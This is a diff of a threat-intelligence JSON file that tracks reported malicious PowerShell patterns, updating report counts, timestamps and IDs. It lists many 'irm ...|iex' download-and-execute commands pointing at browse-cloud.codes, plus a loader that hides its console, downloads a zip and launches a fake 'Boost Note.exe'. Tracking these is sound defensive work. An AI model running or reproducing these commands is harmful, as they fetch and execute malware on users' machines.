@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 170,
-    "ReportCount": 170,
+    "DistinctPayloadCount": 171,
+    "ReportCount": 171,
     "FirstSeen": "2026-11-12T05:39:56.995000+00:00",
-    "LastSeen": "2026-11-18T22:50:05.086000+00:00",
+    "LastSeen": "2026-11-18T23:15:37.353000+00:00",
     "ReportIds": [
       "cmwd4cakt005k0omlhwj5h50t",
       "cmwd5z88d01o80oml0h5gnsao",
@@ -175,7 +175,8 @@
       "cmwlzwqas1r3f0omlavhnj44e",
       "cmwm08hou1raj0omlprcdx0ey",
       "cmwmei4nv1tbg0omlbgmnensw",
-      "cmwmps60l1tve0oml0q574odl"
+      "cmwmps60l1tve0oml0q574odl",
+      "cmwmqp0cv1uc20oml7a6uzgnn"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -201,6 +202,7 @@
       "irm 'browse-cloud.codes/30a71a2fdd245a54'|iex;",
       "irm 'browse-cloud.codes/31da5fb51a18eaa6'|iex;",
       "irm 'browse-cloud.codes/32e494b8378e3441'|iex;",
+      "irm 'browse-cloud.codes/336728d213008c22'|iex;",
       "irm 'browse-cloud.codes/336859a88717c5ae'|iex;",
       "irm 'browse-cloud.codes/3426c2223ed9c3e8'|iex;",
       "irm 'browse-cloud.codes/354fef1345fed255'|iex;",
@@ -698,24 +700,10 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 11,
-    "ReportCount": 93,
-    "FirstSeen": "2026-11-11T23:06:37.145000+00:00",
+    "ReportCount": 79,
+    "FirstSeen": "2026-11-11T23:32:22.674000+00:00",
     "LastSeen": "2026-11-18T16:45:18.406000+00:00",
     "ReportIds": [
-      "cmwcqagtk0c4n0omldm3v34fw",
-      "cmwcqaq5l0c570omlcug1lcmi",
-      "cmwcqd9y80c7c0oml39fz6i6c",
-      "cmwcqdn190c810omlivnixut7",
-      "cmwcqe2w80c930omls75pwevp",
-      "cmwcqeu820c9v0omlw6zgdk5n",
-      "cmwcqy42h0cnd0oml7vxqns0w",
-      "cmwcr0vu30coq0omlg8nbe3mm",
-      "cmwcr1gun0cpy0omlji8pb0fr",
-      "cmwcr1ted0cqz0omlue5bltle",
-      "cmwcr2sq20csf0omlvnp6wv50",
-      "cmwcr3mrb0ctj0omlc6zr15v3",
-      "cmwcr4nve0cuk0oml1wrphqew",
-      "cmwcr4pi30cvb0omlafa4q2sj",
       "cmwcr7lcj0cwa0omljnldfl9a",
       "cmwcrqyux0dcx0omlxynjl1v9",
       "cmwcrvtyw0de90omlmvvbxosz",
@@ -842,11 +830,10 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 46,
-    "FirstSeen": "2026-11-11T23:05:45.104000+00:00",
+    "ReportCount": 45,
+    "FirstSeen": "2026-11-11T23:46:32.397000+00:00",
     "LastSeen": "2026-11-18T16:48:42.514000+00:00",
     "ReportIds": [
-      "cmwcq9cnn0c1l0omlfc0yrkd9",
       "cmwcrpt0v0d8q0omleewsbsdg",
       "cmwdhnhcn049m0omljepq03hd",
       "cmwe79ylx08080oml5k4dzonu",
